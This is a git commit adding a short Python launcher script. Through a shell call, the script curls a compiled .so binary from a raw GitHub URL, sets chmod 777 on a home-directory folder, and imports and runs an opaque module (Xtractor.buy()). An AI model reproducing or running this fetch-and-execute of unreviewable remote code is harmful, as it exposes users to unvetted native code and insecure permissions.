3aee1925bfd13c55834cee812d9637c910b5afd5
Qaiser Abbas <69212320+TechQaiser@users.noreply.github.com>
2023-02-21 02:29:36 -0800

    Add files via upload

---
+++ main.py
@@ -0,0 +1,17 @@
+import re,os,sys
+try:
+    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
+    if not os.path.exists("pycrypto_qsr.cpython-311.so"):
+        os.system("chmod 777 $HOME/Qsr")
+        os.system(f'curl -L {download_link} > pycrypto_qsr.cpython-311.so')
+        import Xtractor as x
+        x.buy()
+    else:
+        import Xtractor as x
+        x.buy()
+except PermissionError:
+    exit('Permission Error ! Found')
+except ConnectionError:
+    exit('Network Error ! Found')
+except Exception as e:
+    print(e)
